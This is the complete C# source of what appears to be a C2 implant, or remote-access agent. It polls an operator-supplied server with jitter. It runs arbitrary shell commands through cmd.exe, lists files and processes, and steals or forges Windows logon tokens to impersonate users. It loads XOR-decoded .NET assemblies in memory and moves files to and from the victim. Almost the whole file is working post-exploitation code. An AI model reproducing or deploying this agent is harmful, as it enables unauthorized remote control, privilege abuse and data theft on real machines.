using System;
using System.Diagnostics;
using System.IO;
using System.Net.Http;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Threading;
using Newtonsoft.Json;

namespace Agent
{
    public class Program
    {
        private static HttpClient client = new HttpClient();
        private static string key;
        private static double sleep;
        private static double jitter;
        private static string check_in_job_id;
        private static string[] endpoints;

        private static byte[] Zor(string key, byte[] input)
        {
            int _key = Int32.Parse(key);
            byte[] mixed = new byte[input.Length];
            for (int i = 0; i < input.Length; i++)
            {
                mixed[i] = (byte)(input[i] ^ _key);
            }
            return mixed;
        }

        private static string Base64Encode(string plainText)
        {
            var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);
            return System.Convert.ToBase64String(plainTextBytes);
        }

        private static string Base64Decode(string base64EncodedData)
        {
            var base64EncodedBytes = System.Convert.FromBase64String(base64EncodedData);
            return System.Text.Encoding.UTF8.GetString(base64EncodedBytes);
        }

        private static string Post(string data, string uri)
        {
            int index = new Random().Next(0, endpoints.Length - 1);
            uri = uri + endpoints[index];
            HttpResponseMessage postResults = client.PostAsync(uri, new StringContent(data)).Result;
            return postResults.Content.ReadAsStringAsync().Result;
        }

        private static void Invoke(byte[] asmb_bytes, string[] asmb_args)
        {
            var asmb = Assembly.Load(asmb_bytes);
            Type[] types = asmb.GetExportedTypes();

            // Run through each type (aka class), finding methods contained within
            foreach (Type type in types)
            {
                // Get all methods in the type
                MethodInfo[] methods = type.GetMethods();

                // Run through each method, searching for Main method (aka function)
                foreach (MethodInfo method in methods)
                {
                    if (method.Name == "Main")
                    {
                        method.Invoke(null, new object[] { asmb_args });
                    }
                }
            }
        }

        private static string ExecuteAssembly(string key, byte[] asmb, string[] args)
        {
            try
            {
                string results = "";
                byte[] asmb_bytes = Zor(key, asmb);

                // Save current STDOUT & STDERR settings.
                var currentOut = Console.Out;
                var currentError = Console.Error;

                // Redirect STDOUT & STDERR to something we can read.
                var ms = new MemoryStream();
                var sw = new StreamWriter(ms)
                {
                    AutoFlush = true
                };
                Console.SetOut(sw);
                Console.SetError(sw);

                Invoke(asmb_bytes, args);

                Console.Out.Flush();
                Console.Error.Flush();

                results = Convert.ToBase64String(ms.ToArray());

                // Restore STDOUT settings.
                Console.SetOut(currentOut);
                Console.SetError(currentError);

                return results;
            }
            catch (Exception ex)
            {
                if (args.Length == 0)
                {
                    return Base64Encode($"Failed to execute assembly with no arguments.\n{ex.ToString()}");
                }
                else
                {
                    return Base64Encode($"Failed to execute assembly with argument(s): {string.Join(" ", args)}\n{ex.ToString()}");
                }

            }

        }

        private static string DIR(string path)
        {
            var results = "";
            var directories = Directory.GetDirectories(path, "*");
            var files = Directory.GetFiles(path, "*");

            for (var i = 0; i < directories.Length; i++)
                results = results + directories[i] + '\n';

            for (var i = 0; i < files.Length; i++)
                results = results + files[i] + '\n';

            return Base64Encode(results);
        }

        private static string PS()
        {
            var results = "";
            var processes = Process.GetProcesses();
            for (var i = 0; i < processes.Length; i++)
            {
                Process process = processes[i];
                results = results + process.ProcessName + '\t' + process.Id + '\t' + process.SessionId + '\n';
            }
            return Base64Encode(results);
        }

        // Make Token

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool LogonUser(string pszUsername, string pszDomain, string pszPassword, LogonProvider dwLogonType, LogonUserProvider dwLogonProvider, out IntPtr phToken);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

        public enum LogonProvider
        {
            LOGON32_LOGON_INTERACTIVE = 2,
            LOGON32_LOGON_NETWORK = 3,
            LOGON32_LOGON_BATCH = 4,
            LOGON32_LOGON_SERVICE = 5,
            LOGON32_LOGON_UNLOCK = 7,
            LOGON32_LOGON_NETWORK_CLEARTEXT = 8,
            LOGON32_LOGON_NEW_CREDENTIALS = 9
        }

        public enum LogonUserProvider
        {
            LOGON32_PROVIDER_DEFAULT = 0,
            LOGON32_PROVIDER_WINNT35 = 1,
            LOGON32_PROVIDER_WINNT40 = 2,
            LOGON32_PROVIDER_WINNT50 = 3
        }

        private static string MakeToken(string[] arguments)
        {
            var domain = Base64Decode(arguments[0]);
            var user = Base64Decode(arguments[1]);
            var password = Base64Decode(arguments[2]);

            if (LogonUser(user, domain, password, LogonProvider.LOGON32_LOGON_INTERACTIVE, LogonUserProvider.LOGON32_PROVIDER_DEFAULT, out var hToken))
            {
                if (ImpersonateLoggedOnUser(hToken))
                {
                    var identity = new WindowsIdentity(hToken);
                    CloseHandle(hToken);
                    return Base64Encode($"Succesfully impersonated token {identity.Name}");
                }
                CloseHandle(hToken);
                return Base64Encode("Succesfully made token, but failed to impersonate");
            }
            else
            {
                CloseHandle(hToken);
                return Base64Encode("Failed to make token.");
            }
        }

        // Steal Token
        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool OpenProcessToken(IntPtr ProcessHandle, TokenAccessFlags DesiredAccess, out IntPtr TokenHandle);

        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        extern static bool DuplicateTokenEx(IntPtr hExistingToken, TokenAccessFlags dwDesiredAccess, IntPtr lpThreadAttributes, SECURITY_IMPERSONATION_LEVEL ImpersonationLevel, TOKEN_TYPE TokenType, out IntPtr phNewToken);

        [DllImport("kernel32.dll", EntryPoint = "CloseHandle", SetLastError = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        extern static bool CloseHandle(IntPtr handle);
        public enum SECURITY_IMPERSONATION_LEVEL
        {
            SecurityAnonymous,
            SecurityIdentification,
            SecurityImpersonation,
            SecurityDelegation
        }

        public enum TOKEN_TYPE
        {
            TokenPrimary = 1,
            TokenImpersonation
        }
        public enum TokenAccessFlags
        {
            STANDARD_RIGHTS_REQUIRED = 0x000F0000,
            STANDARD_RIGHTS_READ = 0x00020000,
            TOKEN_ASSIGN_PRIMARY = 0x0001,
            TOKEN_DUPLICATE = 0x0002,
            TOKEN_IMPERSONATE = 0x0004,
            TOKEN_QUERY = 0x0008,
            TOKEN_QUERY_SOURCE = 0x0010,
            TOKEN_ADJUST_PRIVILEGES = 0x0020,
            TOKEN_ADJUST_GROUPS = 0x0040,
            TOKEN_ADJUST_DEFAULT = 0x0080,
            TOKEN_ADJUST_SESSIONID = 0x0100,
            TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY),
            TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY |
                TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE |
                TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT |
                TOKEN_ADJUST_SESSIONID)
        }
        private static string StealToken(string[] arguments)
        {
            int pid = int.Parse(Base64Decode(arguments[0]));
            Process process = Process.GetProcessById(pid);
            if (!OpenProcessToken(process.Handle, TokenAccessFlags.TOKEN_ALL_ACCESS, out var hToken))
                return Base64Encode("Failed to open process token.");

            if (!DuplicateTokenEx(hToken, TokenAccessFlags.TOKEN_ALL_ACCESS, IntPtr.Zero, SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                                  TOKEN_TYPE.TokenPrimary, out var hTokenDup))
            {
                CloseHandle(hToken);
                process.Dispose();
                return Base64Encode("Failed to duplicate token.");
            }

            if (!ImpersonateLoggedOnUser(hTokenDup))
            {
                CloseHandle(hToken);
                process.Dispose();
                return Base64Encode($"Failed to impersonated token");
            }

            var identity = new WindowsIdentity(hTokenDup);

            CloseHandle(hToken);
            CloseHandle(hTokenDup);
            process.Dispose();

            return Base64Encode($"Succesfully impersonated token {identity.Name}");
        }

        // RevertToSelf

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool RevertToSelf();
        private static string Rev2Self()
        {
            var results = "";
            if (RevertToSelf())
            {
                results = "Dropped impersonated tokens";
            }
            else
            {
                results = "Failed to drop impersonated tokens";
            }
            return Base64Encode(results);
        }

        // GetCurrentToken

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentThread();



        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool OpenThreadToken(IntPtr ThreadHandle, TokenAccessFlags DesiredAccess, bool OpenAsSelf, out IntPtr TokenHandle);

        private static string GetCurrentToken()
        {
            IntPtr tHandle = GetCurrentThread();
            if (!OpenThreadToken(tHandle, TokenAccessFlags.TOKEN_READ | TokenAccessFlags.TOKEN_IMPERSONATE, true, out IntPtr hToken))
                return Base64Encode("No impersonated tokens");
            var identity = new WindowsIdentity(hToken);
            CloseHandle(hToken);
            return Base64Encode($"Currently impersonating {identity.Name}");

        }

        private static string ExecuteCmd(string command)
        {
            var results = "";

            var startInfo = new ProcessStartInfo
            {
                FileName = @"C:\Windows\System32\cmd.exe",
                Arguments = $"/c {command}",
                WorkingDirectory = Directory.GetCurrentDirectory(),
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true,
            };

            var process = Process.Start(startInfo);

            using (process.StandardOutput)
            {
                results += process.StandardOutput.ReadToEnd();
            }

            using (process.StandardError)
            {
                results += process.StandardError.ReadToEnd();
            }

            return Base64Encode(results);
        }

        private static string Download(string path)
        {
            return Convert.ToBase64String(File.ReadAllBytes(path));
        }

        private static string Upload(string[] arguments)
        {
            byte[] data = Convert.FromBase64String(arguments[0]);
            string path = Base64Decode(arguments[1]);
            File.WriteAllBytes(path, data);
            return Base64Encode($"Successfully uploaded file to {path}");
        }

        private static string[] SetSleep(string arg)
        {
            sleep = double.Parse(arg);
            string[] result = { Base64Encode($"Changed sleep to {sleep} second(s)"), Base64Encode(sleep.ToString()) };
            return result;
        }

        private static string[] SetJitter(string arg)
        {
            jitter = double.Parse(arg);
            string[] result = { Base64Encode($"Changed jitter to {jitter}%"), Base64Encode(jitter.ToString()) };
            return result;
        }

        private static async void Run(string uri)
        {
            string batch_response = key;
            while (true)
            {
                job[] batch_request;
                try
                {
                    batch_request = Newtonsoft.Json.JsonConvert.DeserializeObject<job[]>(Post(batch_response, uri));
                } catch (Exception ex)
                {
                    batch_response = "[{\"jsonrpc\": \"2.0\", \"result\":\"\",\"id\":\"" + check_in_job_id + "\"}]";
                    continue;
                }
                batch_response = "[";
                try
                {
                    foreach (var job in batch_request)
                    {                       
                        try
                        {
                            string name = job.name;
                            string[] batch_result = { };
                            string result = "";
                            if (name == "check_in")
                            {
                                check_in_job_id = job.id;
                                break;
                            }
                            if (name == "whoami")
                            {
                                string username = Base64Encode(Environment.UserDomainName + "\\" + Environment.UserName);
                                batch_result = new string[] { username, username };
                            }
                            if (name == "hostname")
                            {
                                string hostname = Base64Encode(Environment.MachineName);
                                batch_result = new string[] { hostname, hostname };
                            }
                            if (name == "os")
                            {
                                result = Base64Encode(Environment.OSVersion.ToString());
                            }
                            if (name == "pwd")
                            {
                                result = Base64Encode(Directory.GetCurrentDirectory());
                            }
                            if (name == "cd")
                            {
                                Directory.SetCurrentDirectory(Base64Decode(job.arguments[0]));
                                result = Base64Encode("Succesfully changed the current working directory.");
                            }
                            if (name == "dir")
                            {
                                result = DIR(Base64Decode(job.arguments[0]));
                            }
                            if (name == "make_token")
                            {
                                result = MakeToken(job.arguments);
                            }
                            if (name == "rev2self")
                            {
                                result = Rev2Self();
                            }
                            if (name == "steal_token")
                            {
                                result = StealToken(job.arguments);
                            }
                            if (name == "get_token")
                            {
                                result = GetCurrentToken();
                            }
                            if (name == "cmd")
                            {
                                result = ExecuteCmd(Base64Decode(job.arguments[0]));
                            }
                            if (name == "ps")
                            {
                                result = PS();
                            }
                            if (name == "execute_assembly")
                            {
                                string[] asmb_args = new string[job.arguments.Length - 2];
                                for (int x = 0; x < job.arguments.Length - 2; x++)
                                {
                                    asmb_args[x] = Base64Decode(job.arguments[x+2]);
                                }
                                result = ExecuteAssembly(Base64Decode(job.arguments[0]), Convert.FromBase64String(job.arguments[1]), asmb_args);
                            }
                            if (name == "download")
                            {
                                result = Download(Base64Decode(job.arguments[0]));
                            }
                            if (name == "upload")
                            {
                                result = Upload(job.arguments);
                            }
                            if (name == "delay")
                            {
                                result = Base64Encode($"Current sleep is {sleep} with a jitter of {jitter}%");                          
                            }
                            if (name == "set sleep")
                            {
                                batch_result = SetSleep(Base64Decode(job.arguments[0]));
                            }
                            if (name == "set jitter")
                            {
                                batch_result = SetJitter(Base64Decode(job.arguments[0]));
                            }
                            if (batch_result.Length > 0)
                            {
                                batch_response = batch_response + "{\"jsonrpc\": \"2.0\", \"result\":[\"" + string.Join("\",\"", batch_result) + "\"],\"id\":\"" + job.id + "\"},";
                            } else
                            {
                                batch_response = batch_response + "{\"jsonrpc\": \"2.0\", \"result\":\"" + result + "\",\"id\":\"" + job.id + "\"},";
                            }
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine(ex.ToString() + "\n" + batch_response);
                            batch_response = batch_response + "{\"jsonrpc\": \"2.0\", \"error\": {\"code\":-32602,\"message\":\"" + Base64Encode($"Job Failed:\n{ex.ToString()}") + "\"},\"id\":\"" + job.id + "\"},";
                        }
                    } 
                }
                catch (Exception ex)
                {
                    // Caught for reliability
                }
                batch_response = batch_response + "{\"jsonrpc\": \"2.0\", \"result\":\"\",\"id\":\"" + check_in_job_id + "\"}]";
                double difference = sleep * jitter/100.0;
                int delay = new Random().Next((int)(sleep - difference) * 1000, (int)(sleep + difference) * 1000);
                Thread.Sleep(delay);
            }
        }
        public static void Main(string[] args)
        {
            key = args[1];
            sleep = double.Parse(args[2]);
            jitter = double.Parse(args[3]);
            endpoints = args[4].Split(',');
            Run(args[0]);
        }
    }

    public class job
    {
        public string jsonrpc { get; set; }
        public string name { get; set; }
        public string[] arguments { get; set; }
        public string id { get; set; }
    }
}
